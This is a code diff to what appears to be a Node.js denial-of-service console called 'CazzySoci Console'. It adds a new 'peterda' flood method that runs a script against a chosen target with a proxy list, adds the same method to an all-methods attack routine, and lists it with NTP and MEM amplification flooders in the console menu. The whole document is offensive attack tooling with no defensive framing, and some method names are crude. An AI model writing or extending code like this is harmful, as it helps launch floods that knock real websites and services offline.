@@ -353,6 +353,10 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
        pushOngoing(target, methods, duration)
 	exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
 	  sigma()
+	  } else if (methods === 'peterda') {
+       pushOngoing(target, methods, duration)
+	exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
+	  sigma()
 	  } else if (methods === 'NTP') {
        pushOngoing(target, methods, duration)
 	exec(`node ${metode} ${target} ${port} 1000`)
@@ -372,6 +376,7 @@ const rape = path.join(__dirname, `/lib/cache/rape.js`);
 const storm = path.join(__dirname, `/lib/cache/storm.js`);
 const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
 const flooder = path.join(__dirname, `/lib/cache/flooder.js`);
+const peterda = path.join(__dirname, `/lib/cache/Peterda.js`);
 const NTP = path.join(__dirname, `NTP`);
 const MEM = path.join(__dirname, `MEM`);
         exec(`node ${flood} ${target} ${duration}`)
@@ -385,6 +390,7 @@ const MEM = path.join(__dirname, `MEM`);
 	exec(`node ${storm} ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${destroy} ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${flooder} ${target} ${duration} 100 100 proxy.txt`)
+	exec(`node ${peterda} ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${NTP} ${target} ${duration} ${port} 1000`)
 	exec(`node ${MEM} ${target} ${duration} ${port} 1000`)
 	  
@@ -694,6 +700,9 @@ permen.question('[\x1b[1m\x1b[32mCazzySoci Console\x1b[0m]: \n', (input) => {
 || rape       || Bypass Protection
 || destroy    || Kill That Socket
 || flooder    || Powerful Flooder
+|| peterda    || Flooder with Advanced Features
+|| NTP        || Ntp Flooder server
+|| MEM        || Mem Flooder server
 [=========================================]
 `);
     sigma();
